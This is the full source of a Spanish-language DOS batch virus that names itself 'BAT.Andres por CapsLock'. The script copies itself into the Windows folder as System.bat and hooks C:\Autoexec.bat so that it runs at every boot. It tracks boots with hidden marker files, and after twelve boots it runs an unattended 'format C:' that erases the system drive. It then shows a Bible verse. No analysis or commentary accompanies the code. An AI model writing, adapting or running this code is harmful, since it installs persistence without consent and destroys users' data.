@echo off
if exist %WINDIR%\_12 goto 1
copy Andres.bat %WINDIR%\System.bat>nul
echo @call %WINDIR%\System.bat>>C:\Autoexec.bat
type nul>%WINDIR%\_12
attrib +r +s +h %WINDIR%\_12
goto fin
:1
if exist %WINDIR%\_11 goto 2
type nul>%WINDIR%\_11
attrib +r +s +h %WINDIR%\_11
goto fin
:2
if exist %WINDIR%\_10 goto 3
type nul>%WINDIR%\_10
attrib +r +s +h %WINDIR%\_10
goto fin
:3
if exist %WINDIR%\_9 goto 4
type nul>%WINDIR%\_9
attrib +r +s +h %WINDIR%\_9
goto fin
:4
if exist %WINDIR%\_8 goto 5
type nul>%WINDIR%\_8
attrib +r +s +h %WINDIR%\_8
goto fin
:5
if exist %WINDIR%\_7 goto 6
type nul>%WINDIR%\_7
attrib +r +s +h %WINDIR%\_7
goto fin
:6
if exist %WINDIR%\_6 goto 7
type nul>%WINDIR%\_6
attrib +r +s +h %WINDIR%\_6
goto fin
:7
if exist %WINDIR%\_5 goto 8
type nul>%WINDIR%\_5
attrib +r +s +h %WINDIR%\_5
goto fin
:8
if exist %WINDIR%\_4 goto 9
type nul>%WINDIR%\_4
attrib +r +s +h %WINDIR%\_4
goto fin
:9
if exist %WINDIR%\_3 goto 10
type nul>%WINDIR%\_3
attrib +r +s +h %WINDIR%\_3
goto fin
:10
if exist %WINDIR%\_2 goto 11
type nul>%WINDIR%\_2
attrib +r +s +h %WINDIR%\_2
goto fin
:11
if exist %WINDIR%\_1 goto 12
type nul>%WINDIR%\_1
attrib +r +s +h %WINDIR%\_1
goto fin
:12
format C: /q /autotest
cls
echo               --------------------------------------------------
echo                                   BAT.Andres
echo                                  por CapsLock
echo               --------------------------------------------------
echo               Y pasando junto a la mar de Galilea,
echo               vio a Simon, y a Andres su hermano,
echo               que echaban la red en la mar;
echo               porque eran pescadores.
echo.
echo               Y les dijo Jesus: Venid en pos de mi,
echo               y hare que seais pescadores de hombres.
echo.
echo               Y luego, dejadas sus redes, le siguieron.
echo.
echo                                               San Marcos 1:16-18
echo               --------------------------------------------------
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
:fin